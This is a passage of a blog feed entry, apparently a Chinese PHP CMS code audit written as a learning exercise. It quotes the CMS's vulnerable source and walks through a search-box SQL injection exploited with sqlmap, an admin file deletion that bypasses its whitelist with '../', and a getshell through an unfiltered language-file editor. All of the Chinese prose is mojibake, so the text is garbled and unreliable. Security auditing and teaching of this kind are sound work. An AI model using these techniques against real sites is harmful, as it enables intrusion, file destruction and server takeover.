class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;æ‚¨çš„ç½‘ç«™æœ‰äº†æ–°çš„ç•™è¨€&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„è¾“å…¥æ˜¯è¢«ä¼ å…¥äº†<code>post</code> å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œè·Ÿè¿›è¯¥å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡äº†<code>strict</code> æ¡ä»¶çš„è¿‡æ»¤å‡½æ•°ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„å®šä¹‰å¤„ã€‚</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸¥æ ¼è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„å±é™©ç¬¦å·</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°html çš„é—­åˆæ ‡ç­¾è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æ²¡æ³•XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œéœ€è¦æ—§å¯†ç ï¼Œè¡Œä¸é€šã€‚</p><h2 id="å¯æ§å˜é‡è¿‡æ»¤"><a href="#å¯æ§å˜é‡è¿‡æ»¤" class="headerlink" title="å¯æ§å˜é‡è¿‡æ»¤"></a>å¯æ§å˜é‡è¿‡æ»¤</h2><h3 id="session-è¿‡æ»¤"><a href="#session-è¿‡æ»¤" class="headerlink" title="session è¿‡æ»¤"></a>session è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-è¿‡æ»¤"><a href="#cookie-è¿‡æ»¤" class="headerlink" title="cookie è¿‡æ»¤"></a>cookie è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-ç™»å½•"><a href="#admin-ç™»å½•" class="headerlink" title="admin ç™»å½•"></a>admin ç™»å½•</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;å¯¹ä¸èµ·ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;è¿”å›é‡æ–°ç™»å½•&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     â€¦â€¦</span><br></pre></td></tr></table></figure><h3 id="user-ç™»å½•"><a href="#user-ç™»å½•" class="headerlink" title="user ç™»å½•"></a>user ç™»å½•</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬éƒ½ç»è¿‡äº†å¸¦æœ‰è¿‡æ»¤çš„å‡½æ•°å¤„ç†ã€‚æ‰€ä»¥åƒï¼ŒSQLæ³¨å…¥å’ŒXSS è¿™ç§éœ€è¦æ„é€ ç‰¹æ®Šç¬¦å·çš„æ¼æ´å‡ ä¹å¾ˆéš¾äº†</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åŸºäºåŠŸèƒ½ç‚¹å»æµ‹ï¼Œå…ˆé«˜å±åä½å±ã€‚åå°ä¸€èˆ¬é˜²å¾¡è¾ƒå¼±ï¼Œä»åå°çªç ´è¾ƒå®¹æ˜“ã€‚è€Œåå°å­˜åœ¨çš„åŠŸèƒ½æœ‰ï¼šå›¾ç‰‡ã€æ–‡ä»¶ã€æ¨¡æ¿ç®¡ç†ã€åˆ é™¤ã€ç•™è¨€å®¡æ ¸ï¼Œç­‰å…¶ä»–åŠŸèƒ½ã€‚</p><h2 id="å‰å°æœç´¢æ¡†SQL-æ³¨å…¥"><a href="#å‰å°æœç´¢æ¡†SQL-æ³¨å…¥" class="headerlink" title="å‰å°æœç´¢æ¡†SQL æ³¨å…¥"></a>å‰å°æœç´¢æ¡†SQL æ³¨å…¥</h2><p>å¼€å¯MySQL ç›‘æ§ï¼Œç„¶åå†æœç´¢æ¡†è¿›è¡Œæœç´¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>å¦‚å›¾ï¼Œ123ï¼Œè¢«å¸¦å…¥SQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå•å¼•å·é—­åˆã€‚å°†å…³é”®å­—åœ¨æ•´ä¸ªæ–‡ä»¶å¤¹ä¸­æœç´¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>è¿™é‡Œå…ˆrawurldecode è§£ç ï¼Œç„¶åå¸¦å…¥æ‹¼æ¥è¿›å…¥æŸ¥è¯¢ã€‚</p><p>ç„¶åä¸‹æ–­ç‚¹è¿›è¡Œåˆ†æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>ç›´æ¥ä¸Šsqlmapã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>æ­¤å¤„é‡‡ç”¨äº†ç™½åå•çš„å½¢å¼ï¼Œåªèƒ½åˆ é™¤ æŒ‡å®šçš„ä¸‰ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä½†æ˜¯å¿½ç•¥äº†å¯ä»¥ç”¨<code>../</code>æ¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr ä»ç¬¬<code>$path</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯å¼€å§‹å¾€ååˆ¤æ–­ï¼Œæˆªå–pathå‰åŠéƒ¨åˆ†é•¿åº¦å’Œç™½åå•æ˜¯å¦ç›¸ç­‰ï¼Œå³æ˜¯å¦æ˜¯ç™½åå•é‡Œçš„é‚£å‡ ä¸ªç›®å½•ï¼Œæ˜¯ï¼Œç„¶å<code>unlink</code>åˆ é™¤æ‰ã€‚</p><p>æˆåŠŸåˆ é™¤æ–‡ä»¶æ—¶ï¼Œè¿”å›1ã€‚</p><p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ªåŸŸåæ˜¯é€šè¿‡MAMPä¿®æ”¹çš„æœ¬åœ°HOSTSæ–‡ä»¶è§£æçš„ï¼Œç„¶åæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0ï¼Œç®€å•è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="æ¼æ´æ¼”ç¤º"></p><h2 id="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"><a href="#åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell" class="headerlink" title="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"></a>åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell</h2><p>æˆåŠŸç¼–è¾‘åï¼Œå›æ˜¾ ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸã€‚é‚£ä¹ˆåœ¨æ•´ä¸ªæ–‡ä»¶ä¸­æœç´¢å³å¯å®šä½åˆ°ä»£ç ã€‚<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;è¿”å›ä¸Šä¸€é¡µ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œç»è¿‡<code>post()</code> å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯å¯¹äº<code>$lang_text</code> çš„è¿‡æ»¤è§„åˆ™æ˜¯<code>no_filter</code> ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹è¯¥è§„åˆ™ã€‚</p><p>/include/function.php,104è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸è¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// åˆ é™¤åæ–œæ </span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ <code>$lang_text</code> å°±é€šè¿‡<code>file_put_contents</code> å†™å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å†™WebShellã€‚</p><p>åŒæ ·çš„ï¼Œä¸‹æ–­ç‚¹æ¥è°ƒè¯•åˆ†æã€‚</p><p>step into ï¼Œæ…¢æ…¢ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå†™å…¥webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> å¯æ§çš„ï¼Œè¿™é‡Œåªéœ€è¦æŠŠ<code>$path</code> æ”¹ä¸ºä¸€ä¸ª<code>.php</code> åç¼€çš„å°±å¯ä»¥GetShell äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="å®¡è®¡æ€»ç»“"><a href="#å®¡è®¡æ€»ç»“" class="headerlink" title="å®¡è®¡æ€»ç»“"></a>å®¡è®¡æ€»ç»“</h1><p>åŸºæœ¬ä¸Šæ˜¯ç…§æ¬ç…§æŠ„åˆ«äººçš„æ€è·¯æ¥æçš„ï¼Œæ€»æ¯”èººç€ç©æ‰‹æœºå¼ºï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚Burp Suite è®¾ç½® åŸŸåå’Œip ç»‘å®šï¼Œphpstorm è°ƒè¯•åˆ†æï¼Œæ€»ä¹‹ï¼Œèƒ½å­¦åˆ°ä¸œè¥¿å°±è¡Œã€‚å­¦åˆ°äº†æ€è·¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¤ç°thinkphp çš„å†å²æ¼æ´ï¼Œå’Œthinkcmf æˆ–è€…å…¶ä»–phpæ¡†æ¶çš„å†å²æ¼æ´ï¼Œå­¦ä¹ å®Œä¹‹åå°±å»æ‰¾cmsè¿›è¡Œå®æˆ˜ï¼ï¼ˆå…¶å®è¿™ä¸ªå·²ç»æç½®äº†å¿«åŠå¹´äº†ã€‚</p><blockquote><p>ä¸€ä¸ªä¸èƒ½å­œå­œä¸å€¦ï¼Œå§‹ç»ˆå¤„äºæ–°çŸ¥è¯†ã€æ–°æŠ€æœ¯å­¦ä¹ çŠ¶æ€ä¸‹çš„å®‰å…¨çˆ±å¥½è€…ï¼Œå¿…ç„¶ä¼šè¢«è¶…è¶Šå’Œå–ä»£ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
